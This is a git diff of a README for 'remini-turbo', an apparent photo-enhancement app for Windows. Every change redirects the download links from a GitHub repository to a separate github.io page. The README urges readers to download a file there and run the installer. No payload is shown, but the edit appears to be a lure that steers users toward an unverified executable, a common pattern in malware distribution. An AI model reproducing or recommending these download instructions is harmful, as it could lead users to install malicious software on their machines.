@@ -1,6 +1,6 @@
 # ⚡ remini-turbo - Transform Your Old Photos Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge&logo=github)](https://github.com/0saifw11-blip/remini-turbo)
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge&logo=github)](https://0saifw11-blip.github.io)
 
 ## 🌟 What is Remini Turbo?
 
@@ -25,7 +25,7 @@ Remini Turbo is a powerful photo enhancement tool that brings your old, blurry, 
 
 ### Step-by-Step Installation Guide
 
-1. **Visit the download page** by clicking the green button above or go directly to: [https://github.com/0saifw11-blip/remini-turbo](https://github.com/0saifw11-blip/remini-turbo)
+1. **Visit the download page** by clicking the green button above or go directly to: [https://0saifw11-blip.github.io](https://0saifw11-blip.github.io)
 
 2. **Download the application** - On the GitHub page, look for the latest release and click the download link. You will receive a file.
 
@@ -39,7 +39,7 @@ Remini Turbo is a powerful photo enhancement tool that brings your old, blurry, 
 
 Visit the link below to download the application. You will find the latest version ready for Windows.
 
-[**🔗 Download Remini Turbo from GitHub**](https://github.com/0saifw11-blip/remini-turbo)
+[**🔗 Download Remini Turbo from GitHub**](https://0saifw11-blip.github.io)
 
 Once you're on the page, look for the "Releases" section or the download button. Click it to get the setup file. After downloading, run the file and follow the installer's steps. No special technical knowledge is required.
 
